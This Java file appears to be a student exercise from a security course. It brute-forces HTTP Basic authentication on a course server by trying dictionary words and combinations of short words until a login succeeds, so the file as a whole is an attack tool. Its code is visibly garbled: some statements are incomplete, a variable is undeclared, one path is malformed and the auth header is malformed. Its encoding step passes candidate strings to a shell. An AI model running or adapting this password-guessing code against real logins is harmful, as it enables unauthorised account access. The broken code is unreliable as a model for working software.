import java.io.*;
import java.*;
import java.net.*;

public class Dictionary

{
   public static void main (String[] args) throws Exception
   {
      System.out.println("Congratulations Your password is "+ checkPassword() );
   }



   private static String checkPassword() throws Exception
   {
      FileReader fRead;
      BufferedReader buf1, buf2;
      String password=" ";

      try
      {
         fRead= new FileReader("/usr/share/lib/dict/words");
         buf1 = new BufferedReader(fRead);
         buf2 = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));

         password= fileRead(buf1, buf2);
         System.out.println("Password is loop2 CheckPassword:"+password);
         return password;
      }
      catch (FileNotFoundException e)
      {
         System.err.println("File not found:"+e.getMessage());
         System.exit(1);
      }
      catch (IOException ioe)
      {
         System.err.println("IOE error: "+ioe.getMessage());
         System.exit(1);
      }

      return password;
   }




   private static String fileRead(BufferedReader buf1, BufferedReader buf2) throws Exception
   {
      String password = " ";
      String password1=" ";
      String passwd = null;

      int countLength1=0;
      int countLength2=0;
      int countLength3=0;



      while ((password = buf1.readLine()) != null)
      {

        if (password.length()<= 3)
        {
           if (password.length()==1)
           {
              countLength1++;
           }
          else if (password.length()==2)
           {
              countLength2++;
           }
           else
           {
              countLength3++;
           }
        }
      }
   
      System.out.println(countLength1+"  "+countLength2+"  "+countLength3);

       

      String[] wordSize1=new String[countLength1];
      String[] wordSize2=new String[countLength2];
      String[] wordSize3=new String[countLength3];

      int a=0; int b=0; int c=0;
      
      while ((password1 = buf2.readLine()) != null)
      {
        if (password1.length()<= 3)
        {
           if (password1.length()==1)
           {
              wordSize1[a++]=password1;
           }
           else if (password1.length()==2)
           {
              wordSize2[b++]=password1;
           }
           else
           {
              wordSize3[c++]=password1;
           }
         }
      }

      passwd = getPasswordRuns4(wordSize3);
      
      if (passwd==null)
      {  
         passwd = getPasswordRuns3(wordSize1,wordSize2);
         if (passwd==null)
         {  
            passwd = getPasswordRuns2(wordSize1,wordSize2);
            if(passwd==null)
            {
               passwd = getPasswordRuns1(wordSize1);  
            }        
         }
      }
      return passwd;
   }
      
   private static String getPasswordRuns2(String[] wordSize1,String[] wordSize2)  throws Exception
   {
      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec;  
      String password=" "; 
      String passwd=" ";      
      
     
      for (int i=0; i< wordSize1.length; i++)
      {
        for (int j=0; j< wordSize2.length; j++)
        {
           String userPasswd= ":"+wordSize1[i]+wordSize2[j];
           System.out.println(userPasswd);

           sec = (HttpURLConnection)url.openConnection();
           sec.setRequestProperty("Authorization", " " + encode(userPasswd));
            
           if (sec.getHeaderField(0).equals("HTTP/1.1 200 OK"))
           {
              passwd=password;
              return passwd;
           }
           sec.disconnect();  
        }  
     }   
     return null;
   }

   private static String getPasswordRuns3(String[] wordSize1,String[] wordSize2) throws Exception
   {
      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec;  
      String password=" "; 
      String passwd=null; 
      
      for (int i=0; i< wordSize2.length; i++)
      {
         for (int j=0; j< wordSize1.length; j++)
         {
            password= wordSize2[i]+wordSize1[j];
            String userPasswd= ":"+password;
            sec = (HttpURLConnection)url.openConnection();
            sec.setRequestProperty("Authorization", " " + encode(userPasswd));
            if (sec.getHeaderField(0).equals("HTTP/1.1 200 OK"))
            {
               passwd=password;
               return passwd;
            }
            sec.disconnect();
         }
      }  
      return null;
   }

   private static String getPasswordRuns4(String[] wordSize3) throws Exception
   {
      int attempt=0;
      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec;  
      String password=" "; 
      String passwd=null;      

      for (int i=0; i< wordSize3.length; i++)
      {
        attempt++;
        password= wordSize3[i];
        String userPasswd= ":"+password;
        System.out.println(attempt+" "+userPasswd);

        sec = (HttpURLConnection)url.openConnection();
        sec.setRequestProperty("Authorization", " " + encode(userPasswd));
        if (sec.getHeaderField(0).equals("HTTP/1.1 200 OK"))
        {
          passwd=password;
          return passwd;
        }
            sec.disconnect();
      }
      return "Password not found";
   }

 
   private static String getPasswordRuns1(String[] wordSize1) throws Exception
   {
      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec;  
      String password=" "; 
      String passwd=null;      
      
      for (int i=0; i< wordSize1.length; i++)
      {
         for (int j=0; j< wordSize1.length; j++)
         {
            for (int k=0; k< wordSize1.length; k++)
            {
             password= wordSize1[i]+wordSize1[j]+wordSize1[k];
             String userPasswd= ":"+password;
             System.out.println(userPasswd);

             sec = (HttpURLConnection)url.openConnection();
             sec.setRequestProperty("Authorization", " " + encode(userPasswd));

             if (sec.getHeaderField(0).equals("HTTP/1.1 200 OK"))
             {
                passwd=password;
                System.out.println("Password is loop1 readfile:"+password);
                return passwd;
             }
             sec.disconnect();
            } 
          }  
       }
       return passwd;
   }

  private static String encode(String userPasswd) throws Exception
   {
      String ;
      String encodedUserPasswd=" ";
      String addr= "~//base64_encode.php "+userPasswd ;
      Process p = Runtime.getRuntime().exec(new String[]{"/usr/local//bash","-c", addr});
      BufferedReader resp = new BufferedReader(new InputStreamReader(p.getInputStream()));

      while ( (bf  = resp.readLine()) != null )
      {
         encodedUserPasswd=bf.get;
      }
      return encodedUserPasswd;
   }





}
